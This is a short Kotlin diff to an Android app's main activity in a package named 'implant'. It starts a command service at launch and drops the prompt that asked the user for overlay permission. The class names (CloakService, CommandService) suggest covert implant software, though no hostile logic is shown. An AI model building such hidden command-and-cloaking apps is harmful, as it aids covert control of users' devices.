@@ -8,6 +8,7 @@ import android.os.Bundle
 import android.provider.Settings
 import android.support.v7.app.AppCompatActivity
 import com.cooperthecoder.implant.cloak.CloakService
+import com.cooperthecoder.implant.command.CommandService
 import com.cooperthecoder.implant.dagger.DaggerService
 
 
@@ -17,11 +18,8 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        if (overlayPermissionRequired()) {
-            val appUri = Uri.fromParts("package", packageName, null)
-            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, appUri)
-            startActivityForResult(intent, REQUEST_CODE_OVERLAY)
-        } else {
+        CommandService.start(this)
+        if (!overlayPermissionRequired()) {
             startCloakService()
         }
     }
